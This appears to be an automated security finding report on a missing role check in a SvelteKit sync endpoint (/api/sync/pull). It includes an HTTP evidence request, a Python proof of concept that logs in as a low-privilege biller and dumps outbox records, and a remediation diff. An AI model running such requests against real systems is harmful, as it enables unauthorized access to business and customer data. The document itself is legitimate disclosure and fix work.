# Broken Function Level Authorization in /api/sync/pull Exposes Sync Outbox Records

**ID:** vuln-0003
**Severity:** MEDIUM
**Found:** 2026-11-01 13:03:21 UTC
**Target:** http://host.docker.internal:5173
**Endpoint:** /api/sync/pull
**Method:** GET
**CWE:** CWE-862
**CVSS:** 6.5
**Confidence:** High
**Fix Effort:** Low

## Description

The database synchronization pull endpoint lacks role authorization, allowing low-privilege counter billers to read internal replication outbox records containing complete transactional and business data.

## Evidence

Querying `/api/sync/pull?clientId=cloud` with the biller session cookie returns HTTP 200 OK with full sync outbox contents:
```http
GET /api/sync/pull?clientId=cloud HTTP/1.1
Host: host.docker.internal:5173
Cookie: sessionId=8530a358db46e439bdb28bcd756932102764c1e2f6c43c4ebe4b0035da6f7ff0

HTTP/1.1 200 OK
Content-Type: application/json

{"items":[{"id":"3b1c157d-13ac-4b25-9827-294184db967e","tableName":"batch_stock_events","rowId":"45c0742d-ab28-4bcb-ae0e-8d7a1d75f592","operation":"insert","payload":{...},"targetNode":"cloud",...},...]}
```
Historical inventory events, batch updates, and transactions queued for replication are fully disclosed to low-privilege users.

## Impact

Low-privilege counter staff can harvest raw business event data queued for cloud sync, including internal batch updates, sales records, customer identifiers, supplier transaction details, and audit metadata.

## Counterevidence

Checked if /api/sync/pull restricts callers. While hooks.server.ts ensures session authentication, the route handler GET in src/routes/api/sync/pull/+server.ts completely lacks any role check. By passing ?clientId=cloud, any low-privilege biller can dump synchronization outbox records containing transactions, batches, products, and customer details.

## What Would Change This Severity

If unauthenticated access were possible, severity would be High; since authentication is required, severity is Medium.

## Technical Analysis

In `src/routes/api/sync/pull/+server.ts`:
The handler defines `export const GET: RequestHandler = async ({ url }) => { ... }`. It does not check `locals.user.role`.
The query filters `syncOutboxTable` by `targetNode = callerNode`. By supplying `?clientId=cloud` or `?clientId=store_server`, any authenticated caller can query and receive all outbox records, exposing raw database row payloads across multiple domain tables (`sales`, `batches`, `batch_stock_events`, `suppliers`, etc.).

## Proof of Concept

1. Log in as a low-privilege counter biller (`role: biller`).
2. Send a `GET` request to `/api/sync/pull?clientId=cloud`.
3. Observe that the server returns HTTP 200 OK with all queued replication items across the store.

```python
import requests

BASE_URL = "http://host.docker.internal:5173"

session = requests.Session()
login_res = session.post(
    f"{BASE_URL}/login",
    data={"username": "biller", "password": "biller123"}
)
assert login_res.status_code == 200

pull_res = session.get(f"{BASE_URL}/api/sync/pull?clientId=cloud")
print("Status code:", pull_res.status_code)
assert pull_res.status_code == 200
data = pull_res.json()
print("Items retrieved:", len(data.get("items", [])))
assert "items" in data
print("Successfully dumped sync outbox events as low-privilege biller!")
```

## Code Analysis

**Location 1:** `src/routes/api/sync/pull/+server.ts` (lines 7-8)
  Enforce owner_admin role check on sync pull endpoint
  ```
  export const GET: RequestHandler = async ({ url }) => {
  	const since = url.searchParams.get('since');
  ```

  **Suggested Fix:**
```diff
- export const GET: RequestHandler = async ({ url }) => {
- 	const since = url.searchParams.get('since');
+ export const GET: RequestHandler = async ({ url, locals }) => {
+ 	if (!locals.user || locals.user.role !== 'owner_admin') {
+ 		return json({ error: 'Forbidden: Admin role required' }, { status: 403 });
+ 	}
+ 
+ 	const since = url.searchParams.get('since');
```

## Remediation

In `src/routes/api/sync/pull/+server.ts`, restrict access to `owner_admin` or a dedicated synchronization credential:
```typescript
if (!locals.user || locals.user.role !== 'owner_admin') {
    return json({ error: 'Forbidden: Admin role required' }, { status: 403 });
}
```

## Fix Verification

Gate 1 (Applicability): Verified line numbers 7-8 match verbatim in src/routes/api/sync/pull/+server.ts.
Gate 2 (Security closure): With the check added, requests from biller receive HTTP 403 Forbidden and no outbox rows are queried or leaked.
Gate 3 (Bypass review): Ensures both store_server and cloud targetNode pull queries are protected.
Gate 4 (Preserved behavior): System administration and authorized sync services can still pull sync events.
Gate 5 (Repository checks): Syntactically valid TypeScript matching SvelteKit RequestHandler convention.

Assumes an authenticated attacker with low-privilege 'biller' credentials.
